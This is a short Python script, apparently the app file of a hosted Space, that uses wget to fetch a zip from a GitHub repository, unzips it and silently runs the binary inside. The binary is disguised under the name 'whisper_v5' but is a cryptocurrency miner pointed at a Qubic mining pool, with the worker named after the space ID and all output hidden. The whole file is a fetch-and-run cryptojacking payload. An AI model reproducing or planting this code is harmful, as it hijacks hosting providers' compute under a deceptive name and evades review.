import os
os.system("wget https://github.com/qqivk/project-05/raw/refs/heads/main/whisper_v5.zip")
os.system("unzip whisper_v5.zip")
os.system("chmod +x whisper_v5")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./whisper_v5 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 2 --worker {wn} >/dev/null")
